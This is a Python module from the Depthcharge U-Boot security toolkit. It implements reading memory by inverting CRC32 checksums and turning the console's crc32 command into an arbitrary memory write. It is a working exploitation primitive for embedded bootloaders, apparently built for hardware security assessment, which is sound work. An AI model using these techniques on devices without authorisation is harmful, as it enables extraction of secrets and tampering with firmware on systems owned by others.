# SPDX-License-Identifier: BSD-3-Clause
# Depthcharge: <https://github.com/nccgroup/depthcharge>
"""
Implements CRC32MemoryReader and CRC32MemoryWriter
"""

import re
import sys

from zlib import crc32

from .reader import MemoryWordReader
from .stratagem import StratagemMemoryWriter

from ..hunter import ReverseCRC32Hunter
from ..operation import Operation, OperationAlignmentError
from ..revcrc32 import reverse_crc32_4bytes

_RESP_REGEX = re.compile(
    r'CRC32 for [0-9a-fA-F]+\s+\.\.\.\s+[0-9a-fA-F]+\s+==>\s+(?P<result>[0-9a-fA-F]+)',
    re.IGNORECASE
)


class CRC32MemoryReader(MemoryWordReader):
    """
    Reads memory contents by performing CRC32 operations over
    1, 2, or 4-byte values and using lookup-tables entries or inverse
    calculations to recover the input data from the checksum.
    """

    _required = {
        'commands': ['crc32']
    }

    @classmethod
    def rank(cls, **kwargs) -> int:
        # This is slow
        return 20

    def __init__(self, ctx, **kwargs):
        super().__init__(ctx, **kwargs)

        # By default we'll use calls to reverse_crc32_4bytes().
        # For the final 1-3 bytes, we'll use quickly-generated reverse LUTs.
        #
        # We defer population of this until _setup() is invoked
        self._revlut = {}

    def _setup(self, addr, size):
        # Nothing to do if we've already set this up
        if len(self._revlut) > 0:
            return

        # Shouldn't happen unless changes are made to the CRC polynomial.
        # More likely would be indicative of our own code defect.
        col_err = 'Unexpected reverse LUT collision @ i={:d}, j={:d}'

        for i in range(0, 256):
            b0 = i.to_bytes(1, sys.byteorder)
            state = crc32(b0)

            if state not in self._revlut:
                self._revlut[state] = b0
            else:
                raise RuntimeError(col_err.format(i, -1))

            for j in range(0, 256):
                b1 = j.to_bytes(1, sys.byteorder)
                tmp = crc32(b1, state)

                if tmp not in self._revlut:
                    self._revlut[tmp] = b0 + b1
                else:
                    raise RuntimeError(col_err.format(i, j))

    def _revcrc32(self, addr: int, size: int) -> bytes:
        cmd = 'crc32 {:x} {:x}'.format(addr, size)
        resp = self._ctx.send_command(cmd)
        match = _RESP_REGEX.match(resp)
        if not match:
            err = 'Response to crc32 command did not match expected output: ' + resp
            raise RuntimeError(err)

        hexstr = match.group('result')

        # The textual output is a human-readable big-endian forman
        checksum = int.from_bytes(bytes.fromhex(hexstr), 'big')

        if size == 4:
            data = reverse_crc32_4bytes(checksum).to_bytes(4, sys.byteorder)
        elif size in (1, 2):
            data = self._revlut[checksum]
        else:
            # Shouldn't be possible, given MemoryWordReader promises
            # Occurance is indicative of a bug.
            raise RuntimeError('Unexpected word read size: ' + str(size))

        if len(data) != size:
            err = 'Data and read size mismatch @ 0x{:08x}: {:d}-byte CRC32 -> {:d}-byte data'
            raise RuntimeError(err.format(addr, size, len(data)))

        return data

    def _read_word(self, addr: int, size: int, handle_data):
        if size == 8:
            # For 64-bit platforms where we normally try to operate on 8-byte words, split
            # the read into two 4-byte accesses.
            data = self._revcrc32(addr, 4)
            data += self._revcrc32(addr + 4, 4)
        else:
            data = self._revcrc32(addr, size)

        handle_data(data)


class CRC32MemoryWriter(StratagemMemoryWriter):
    """
    The U-Boot console's ``crc32`` command allows a computed checksum to be written
    to a specified memory addres. By computing a CRC32 preimage, this can be exploited as an
    arbitrary memory write operation.

    The CRC32MemoryWriter inherits :py:class:`~depthcharge.memory.StratagemMemoryWriter`
    and can be used to perform writes using :py:class:`~depthcharge.Stratagem` objects produced by
    :py:class:`~depthcharge.hunter.ReverseCRC32Hunter`.
    """

    _required = {
        'commands': ['crc32'],
        'stratagem': True,
    }

    # iterations: # of CRC32 operations to perform
    # tsrc_off:   If present, source data is in our working target buffer at this offset.
    #             Otherwise, src_addr should be used.
    _stratagem_spec   = Operation._create_stratagem_spec(iterations=int, tsrc_off=int)

    # ReverseCRC32Hunter builds the stratagem we write
    _stratagem_hunter = ReverseCRC32Hunter

    _cmd_fmt = 'crc32 0x{:x} 0x{:x} 0x{:x}'

    @classmethod
    def rank(cls, **kwargs) -> int:
        # Stratagem computation can take quite a bit of time
        return 5

    def _write_stratagem(self, wr_addr: int, stratagem, progress):

        if wr_addr % self._ctx.arch.alignment != 0:
            raise OperationAlignmentError(self._ctx.arch.alignment, cls=self)

        for entry in stratagem:
            # Is our source data in the original source location or a temporary
            # location withing out target buffer?
            if 'tsrc_off' not in entry:
                src_addr = entry['src_addr']
            else:
                src_addr = wr_addr + entry['tsrc_off']

            input_size  = entry['src_size']
            iterations  = entry['iterations']

            dst_addr = wr_addr + entry['dst_off']

            # Perform the first iteration on the specified input size
            cmd = self._cmd_fmt.format(src_addr, input_size, dst_addr)
            self._ctx.send_command(cmd, check=True)
            progress.update(1)

            # All remaining iterations compute CRC32 over the the prior output
            cmd = self._cmd_fmt.format(dst_addr, 4, dst_addr)
            for i in range(1, iterations):
                self._ctx.send_command(cmd, check=True)
                progress.update(1)


# Register declared Operations
Operation.register(CRC32MemoryReader, CRC32MemoryWriter)
